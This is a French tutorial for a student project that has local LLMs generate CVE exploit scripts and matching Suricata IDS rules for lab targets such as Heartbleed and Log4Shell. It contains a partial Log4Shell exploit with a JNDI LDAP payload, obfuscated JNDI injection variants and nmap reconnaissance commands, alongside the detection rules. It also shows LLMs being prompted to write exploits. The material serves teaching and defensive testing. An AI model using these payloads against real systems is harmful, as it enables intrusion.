#  Tutoriel Complet - PRAPP Groupe 52

## Introduction

Ce tutoriel vous guide pas à pas dans l'utilisation du projet **IA & Cybersécurité**. Vous apprendrez à générer des scripts d'exploitation, créer des règles IDS, et utiliser l'interface web d'orchestration.

**Temps estimé** : 30-45 minutes

**Prérequis** : Installation complète du projet (voir [README.md](./README.md))

---

##  Sommaire

1. [Préparation de l'environnement](#1-préparation-de-lenvironnement)
2. [Premier exploit avec Attaque_LLM](#2-premier-exploit-avec-attaque_llm)
3. [Premières règles IDS avec IDS_LLM](#3-premières-règles-ids-avec-ids_llm)
4. [Utilisation de l'Interface Web](#4-utilisation-de-linterface-web)
5. [Utilisation avancée du RAG](#5-utilisation-avancée-du-rag)
6. [Cas pratiques](#6-cas-pratiques)
7. [Bonnes pratiques](#7-bonnes-pratiques)

---

## 1. Préparation de l'environnement

### 1.1 Vérifier Ollama

Ouvrez un terminal PowerShell et lancez Ollama :

```powershell
ollama serve
```

**Laissez ce terminal ouvert** pendant toute la session.

Dans un nouveau terminal, vérifiez les modèles installés :

```powershell
ollama list
```

Résultat attendu :
```
NAME                ID              SIZE    MODIFIED
mistral:latest      2ae6f6dd7a3d    4.1 GB  3 days ago
codestral:latest    7e8e0a6b1c2d    8.2 GB  1 day ago
```

Si aucun modèle n'est installé :
```powershell
ollama pull mistral
ollama pull codestral  # Recommandé pour le code
```

### 1.2 Vérifier Nmap

```powershell
nmap --version
```

Résultat attendu :
```
Nmap version 7.94 ( https://nmap.org )
```

### 1.3 Préparer une cible de test

 **Important** : N'utilisez JAMAIS ce projet sur des systèmes non autorisés.

Options recommandées :
- **Metasploitable 2** : VM vulnérable pour tests
- **DVWA** : Damn Vulnerable Web Application
- **VulnHub** : VMs pré-configurées

Pour ce tutoriel, nous utiliserons l'IP fictive `192.168.56.101`.

---

## 2. Premier exploit avec Attaque_LLM

### 2.1 Lancer le module

```powershell
cd ..
# Install consolidated dependencies
pip install -r requirements.txt
cd Attaque_LLM
python main.py
```

### 2.2 Workflow complet : Heartbleed

Suivez les étapes interactives :

```
============================================================
 Générateur de Scripts d'Exploitation CVE
  Usage éducatif et éthique uniquement
============================================================

CVE à exploiter (ex: CVE-2014-0160): CVE-2014-0160

Adresse IP de la cible (ex: 192.168.1.10): 192.168.56.101

 Mode: Détection Heartbleed directe avec Nmap

Options de scan:
  1. Détection automatique des ports SSL/TLS (recommandé)
  2. Spécifier manuellement les ports

Votre choix (1/2, Entrée=1): 1
```

Le système scanne automatiquement les ports SSL/TLS :

```
 Détection des ports SSL/TLS sur 192.168.56.101...
   Plage de ports: 1-10000
    Port SSL/TLS détecté: 443 (https)
    Port SSL/TLS détecté: 8443 (ssl/http)

 2 port(s) SSL/TLS détectés: 443, 8443

 Test Heartbleed sur 192.168.56.101...
   Ports testés: 443, 8443
   Script NSE: ssl-heartbleed

 Ports ouverts détectés:
   • Port 443: https (open)  VULNÉRABLE

 1 port(s) VULNÉRABLE(S) détecté(s) !
 Port vulnérable sélectionné automatiquement: 443
```

Sélectionnez le modèle LLM :

```
 Modèles disponibles (2):
   1. mistral:latest
   2. codestral:latest

Choisissez un modèle (numéro ou nom, Entrée pour le 1er): 2
Modèle sélectionné: codestral:latest
```

Le LLM génère le script :

```
 Génération du script d'exploitation pour CVE-2014-0160...

============================================================
 Script généré
============================================================

 Script sauvegardé: scripts/exploit_CVE_2014_0160_20251127_143022.py
```

### 2.3 Examiner le script généré

```powershell
Get-Content scripts/exploit_CVE_2014_0160_20251127_143022.py
```

Le script contient généralement :
- Imports nécessaires (socket, ssl, struct)
- Payload Heartbleed malformé
- Fonction d'envoi et réception
- Parsing de la réponse mémoire
- Gestion des erreurs

### 2.4 Autres CVE à tester

| CVE | Description | Commande |
|-----|-------------|----------|
| CVE-2017-0144 | EternalBlue (SMB) | Port 445 |
| CVE-2021-44228 | Log4Shell | Port 8080 |
| CVE-2014-6271 | Shellshock | Port 80/443 |
| CVE-2019-0708 | BlueKeep (RDP) | Port 3389 |

---

## 3. Premières règles IDS avec IDS_LLM

### 3.1 Lancer le module

```powershell
cd IDS_LLM
python main.py
```

### 3.2 Générer des règles pour Heartbleed

```
============================================================
 Générateur de Scripts de règles IDS
============================================================

CVE à défendre (ex: CVE-2014-0160): CVE-2014-0160

 Modèles disponibles (2):
   1. mistral:latest
   2. codestral:latest

Choisissez un modèle: 1

 Génération des règles IDS pour CVE-2014-0160...

============================================================
 Script généré
============================================================

 Script sauvegardé: ./IDS_LLM/scripts/ids_CVE_2014_0160_20251127_150000.txt
```

### 3.3 Examiner les règles générées

```powershell
Get-Content scripts/ids_CVE_2014_0160_20251127_150000.txt
```

Exemple de règles Suricata générées :

```suricata
# Règles IDS pour CVE-2014-0160 (Heartbleed)
# Généré le 2025-11-27 15:00:00

# Détection de requête Heartbeat malformée
alert tls any any -> any any (
    msg:"HEARTBLEED Malformed Heartbeat Request";
    flow:established,to_server;
    content:"|18 03|"; depth:2;
    content:"|01|"; distance:1; within:1;
    byte_test:2,>,16384,3;
    classtype:attempted-admin;
    sid:1000001; rev:1;
    reference:cve,2014-0160;
)

# Détection de réponse Heartbeat anormale (fuite mémoire)
alert tls any any -> any any (
    msg:"HEARTBLEED Memory Leak Response";
    flow:established,to_client;
    content:"|18 03|"; depth:2;
    byte_test:2,>,256,3;
    classtype:successful-admin;
    sid:1000002; rev:1;
    reference:cve,2014-0160;
)
```

### 3.4 Intégrer dans Suricata (optionnel)

```bash
# Copier les règles
sudo cp scripts/ids_CVE_*.txt /etc/suricata/rules/custom.rules

# Éditer la configuration
sudo nano /etc/suricata/suricata.yaml
# Ajouter: - custom.rules dans rule-files

# Recharger
sudo suricatasc -c reload-rules

# Surveiller les alertes
sudo tail -f /var/log/suricata/fast.log
```

---

## 4. Utilisation de l'Interface Web

### 4.1 Démarrer les services

**Terminal 1 - Backend :**
```powershell
cd Interface_web\orchestrator
.\venv\Scripts\Activate.ps1
uvicorn app.main:app --reload --port 8000
```

**Terminal 2 - Frontend :**
```powershell
cd Interface_web\frontend
npm start
```

L'interface s'ouvre sur `http://localhost:3000`

### 4.2 Créer un scénario complet

#### Étape 1 : Configuration

1. **CVE** : Entrez `CVE-2021-44228` (Log4Shell)
2. **Instructions LLM** :
   ```
   Génère un exploit utilisant JNDI injection.
   Cible un serveur Minecraft vulnérable.
   Utilise un payload LDAP.
   ```
3. **RAG** : Cochez  "Utiliser le RAG"
4. Cliquez sur **"Générer script & règles IDS"**

#### Étape 2 : Examiner les résultats

**Script d'attaque généré** :
```python
#!/usr/bin/env python3
"""
Exploit pour CVE-2021-44228 (Log4Shell)
Cible: Serveur Minecraft vulnérable
"""
import requests

def exploit(target_ip, target_port, ldap_server):
    payload = "${jndi:ldap://" + ldap_server + "/a}"
    headers = {
        "User-Agent": payload,
        "X-Api-Version": payload
    }
    # ...
```

**Règles IDS générées** :
```suricata
alert http any any -> any any (
    msg:"LOG4SHELL JNDI Injection Attempt";
    content:"${jndi:"; nocase;
    pcre:"/\$\{jndi:(ldap|rmi|dns|iiop)/i";
    sid:1000010; rev:1;
    reference:cve,2021-44228;
)
```

#### Étape 3 : Affiner avec le feedback

Si le script n'est pas satisfaisant, utilisez la zone de feedback :

```
Le script doit aussi tester les variantes obfusquées :
- ${${lower:j}ndi:ldap://...}
- ${${env:NaN:-j}ndi:ldap://...}
Ajoute aussi un mode verbose avec logging.
```

Cliquez sur **"Envoyer feedback au LLM"**

Le LLM régénère les scripts en tenant compte de vos retours.

#### Étape 4 : Évaluer la qualité

Cliquez sur **"Évaluer la qualité du code"**

Résultat :
```
Score Global: 78/100
Script d'Attaque: 82/100
Règles IDS: 74/100

Feedback Attaque:
-  Bonne gestion des variantes d'injection
-  Manque de timeout sur les requêtes
-  Pas de vérification SSL

Feedback IDS:
-  Détection des payloads basiques
-  Variantes encodées non couvertes
-  Risque de faux positifs sur "jndi"
```

#### Étape 5 : Valider et exécuter

1. Cochez  les deux validations humaines
2. Cliquez sur **"Exécuter la simulation sur le lab"**

Résultat (mock) :
```
Attack success: True
Detected by IDS: True

Logs:
[2025-11-27 15:30:00] ATTACK: Connexion à 192.168.56.101:8080
[2025-11-27 15:30:01] ATTACK: Envoi payload JNDI
[2025-11-27 15:30:01] IDS: Alerte sid:1000010 - LOG4SHELL detected
[2025-11-27 15:30:02] ATTACK: Réponse reçue - exploitation réussie
```

---

## 5. Utilisation avancée du RAG

### 5.1 Comprendre le RAG

Le **RAG (Retrieval-Augmented Generation)** enrichit les prompts LLM avec des informations techniques provenant de la base NVD (National Vulnerability Database).

**Sans RAG** :
```
Prompt: "Génère un exploit pour CVE-2021-44228"
→ Le LLM se base uniquement sur ses connaissances générales
```

**Avec RAG** :
```
Prompt: "Génère un exploit pour CVE-2021-44228"
Contexte injecté: "CVE-2021-44228: Apache Log4j2 <=2.14.1 
contains a JNDI injection vulnerability in the lookup 
feature. Allows remote code execution via crafted log 
messages containing ${jndi:ldap://...} patterns."
→ Le LLM a un contexte précis et technique
```

### 5.2 Initialiser la base RAG

```powershell
cd Attaque_LLM
python -c "from rag_engine import initialize_knowledge_base; initialize_knowledge_base()"
```

Le processus :
1. Lit les fichiers JSON NVD (2014, 2016, 2021, 2024, 2025)
2. Extrait les descriptions de chaque CVE
3. Vectorise avec HuggingFace Embeddings
4. Stocke dans ChromaDB

```
 Initialisation du RAG (Ingestion des données)...
 Lecture de nvdcve-2.0-2025.json...
 15234 CVEs trouvées
 Lecture de nvdcve-2.0-2024.json...
 28456 CVEs trouvées
...
 Vectorisation de 85000 documents (patience)...
 Base de connaissances créée et sauvegardée.
```

### 5.3 Tester la recherche RAG

```python
from rag_engine import get_cve_context

# Recherche Log4Shell
context = get_cve_context("CVE-2021-44228")
print(context)
```

Résultat :
```
CVE: CVE-2021-44228
Description: Apache Log4j2 2.0-beta9 through 2.15.0 
(excluding security releases 2.12.2, 2.12.3, and 2.3.1) 
JNDI features used in configuration, log messages, and 
parameters do not protect against attacker controlled 
LDAP and other JNDI related endpoints...
```

### 5.4 Ajouter de nouvelles données NVD

1. Téléchargez les fichiers JSON depuis [NVD](https://nvd.nist.gov/vuln/data-feeds)

2. Placez-les dans `Attaque_LLM/CVE_info_rag/`

3. Éditez `rag_engine.py` pour ajouter les chemins

4. Supprimez l'ancienne base et réinitialisez :
```powershell
Remove-Item -Recurse chroma_db
python -c "from rag_engine import initialize_knowledge_base; initialize_knowledge_base()"
```

---

## 6. Cas pratiques

### 6.1 Cas pratique : Audit d'un serveur web

**Scénario** : Vous devez auditer un serveur web Apache sur `192.168.1.50`

#### Étape 1 : Reconnaissance avec Nmap

```powershell
nmap -sV -p 80,443,8080 192.168.1.50
```

Résultat :
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache 2.4.49
443/tcp  open  ssl     Apache 2.4.49
```

#### Étape 2 : Identifier les CVE applicables

Apache 2.4.49 est vulnérable à **CVE-2021-41773** (Path Traversal)

#### Étape 3 : Générer l'exploit

```powershell
cd Attaque_LLM
python main.py
```

```
CVE à exploiter: CVE-2021-41773
Adresse IP: 192.168.1.50
```

#### Étape 4 : Générer les règles IDS

```powershell
cd IDS_LLM
python main.py
```

```
CVE à défendre: CVE-2021-41773
```

#### Étape 5 : Documenter les résultats

Créez un rapport avec :
- Scripts générés
- Règles IDS proposées
- Recommandations de correction

---

### 6.2 Cas pratique : Comparaison offensive/défensive

**Objectif** : Évaluer si les règles IDS détectent bien l'exploit généré

#### Workflow

1. **Générer l'exploit** pour CVE-2014-0160
2. **Générer les règles IDS** pour CVE-2014-0160
3. **Configurer Suricata** avec les règles
4. **Exécuter l'exploit** sur une cible de test
5. **Vérifier les alertes** Suricata

```bash
# Surveiller les alertes en temps réel
sudo tail -f /var/log/suricata/fast.log | grep HEARTBLEED
```

Si l'exploit est détecté → Les règles IDS sont efficaces 
Si non détecté → Affiner les règles avec feedback LLM 

---

## 7. Bonnes pratiques

### 7.1 Sécurité

|  À faire |  À éviter |
|-----------|------------|
| Utiliser des VMs isolées | Tester sur des systèmes de production |
| Documenter tous les tests | Oublier de logger les actions |
| Demander des autorisations | Attaquer sans permission |
| Nettoyer après les tests | Laisser des backdoors |

### 7.2 Qualité des scripts

|  Bonnes pratiques | Explication |
|---------------------|-------------|
| Vérifier la syntaxe | `python -m py_compile script.py` |
| Tester dans un sandbox | VM dédiée aux tests |
| Ajouter des commentaires | Pour la compréhension |
| Gérer les erreurs | try/except appropriés |

### 7.3 Optimisation LLM

| Conseil | Exemple |
|---------|---------|
| Instructions précises | "Utilise Python 3.10, sans dépendances externes" |
| Contexte technique | "La cible est un serveur Apache 2.4 sur Ubuntu 22.04" |
| Contraintes explicites | "Le script doit s'exécuter en moins de 5 secondes" |
| Itérer avec feedback | "Ajoute une gestion des timeouts" |

### 7.4 Modèles LLM recommandés

| Tâche | Modèle | Raison |
|-------|--------|--------|
| Code Python | `codestral` | Spécialisé code |
| Règles IDS | `mistral` | Bon en syntaxe |
| Analyse CVE | `llama3` | Contexte large |
| Général | `mistral` | Polyvalent |

---

##  Exercices

### Exercice 1 : Heartbleed complet
1. Générez un exploit pour CVE-2014-0160
2. Générez les règles IDS correspondantes
3. Évaluez la qualité via l'interface web
4. Améliorez avec le feedback jusqu'à score > 80

### Exercice 2 : Log4Shell avancé
1. Activez le RAG
2. Générez un exploit multi-variantes
3. Créez des règles IDS détectant l'obfuscation
4. Documentez les variantes non détectées

### Exercice 3 : Comparaison de modèles
1. Générez le même exploit avec Mistral et Codestral
2. Comparez la qualité du code
3. Identifiez les forces de chaque modèle

---

##  Ressources supplémentaires

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [CVE Details](https://www.cvedetails.com/)
- [Exploit Database](https://www.exploit-db.com/)
- [Suricata Rules Writing](https://suricata.readthedocs.io/en/latest/rules/)
- [Nmap NSE Scripts](https://nmap.org/nsedoc/)

---

**Félicitations !** Vous maîtrisez maintenant les bases du projet PRAPP. Continuez à explorer et à améliorer vos compétences en cybersécurité offensive et défensive.

*Tutoriel - Projet PRAPP 2025 - Groupe 52*
